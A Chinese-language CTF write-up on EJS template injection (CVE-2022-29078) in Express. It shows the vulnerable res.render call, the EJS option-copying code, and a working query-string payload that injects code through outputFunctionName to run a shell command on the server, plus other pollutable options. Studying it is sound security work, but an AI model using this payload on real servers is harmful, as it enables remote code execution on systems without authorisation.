---
title: CTF 中的 EJS 漏洞筆記
contest: EJS CTF
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [Express, EJS, res.render('index', req.query), settings['view options']污染, outputFunctionName RCE, opts.shell, prepended include, CVE-2022-29078]
attack_chain:
  - Express + EJS 模板引擎
  - res.render('index', req.query) 把 query 直接传给 opts
  - opts.settings['view options'] 被污染
  - outputFunctionName 选项触发 RCE
  - 也可通过 opts.shell / opts.prepended 等 prototype 污染
  - payload: ?settings[view options][outputFunctionName]=...;s=...
key_payload: 'EJS render query 污染 / outputFunctionName RCE / settings[view options] / shell / prepended include / opts.delimiter'
one_liner: CTF EJS 漏洞笔记 — Express + EJS + res.render('index', req.query) 污染 settings['view options'] + outputFunctionName RCE (CVE-2022-29078 风格)。
lesson: EJS render(view, options) 把 options 传到 View 内部,污染 settings/opts 是 RCE 经典链;outputFunctionName 是模板生成函数注入点。
quality: high
---

# CTF 中的 EJS 漏洞筆記

## 速读
EJS 模板注入漏洞笔记 — Express + EJS + 污染 settings['view options'] 触发 RCE。

## 漏洞代码
```javascript
const express = require('express')
const app = express()
app.set('view engine', 'ejs');

app.get('/', (req, res) => {
    res.render('index', req.query);  // 直接把 query 传给 opts
})
```

## 漏洞原理

### renderFile
```javascript
exports.renderFile = function () {
    var args = Array.prototype.slice.call(arguments);
    var filename = args.shift();
    var opts = { filename: filename };
    var data;
    
    if (args.length) {
        data = args.shift();
        if (args.length) {
            utils.shallowCopy(opts, args.pop());
        } else {
            // Express 3 and 4
            if (data.settings) {
                if (data.settings.views) opts.views = data.settings.views;
                if (data.settings['view cache']) opts.cache = true;
                viewOpts = data.settings['view options'];
                if (viewOpts) {
                    utils.shallowCopy(opts, viewOpts);  // 污染点
                }
            }
        }
    }
};
```

## 利用
```bash
?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');s
```

- `outputFunctionName` 是 EJS 生成模板函数名
- 改成 `x;...;s` 注入代码
- 服务端执行 RCE

## 其他污染点
- `opts.shell` - shell 命令前缀
- `opts.prepended` - 预编译 include
- `opts.delimiter` - 模板分隔符
- `opts.client` - 客户端模式
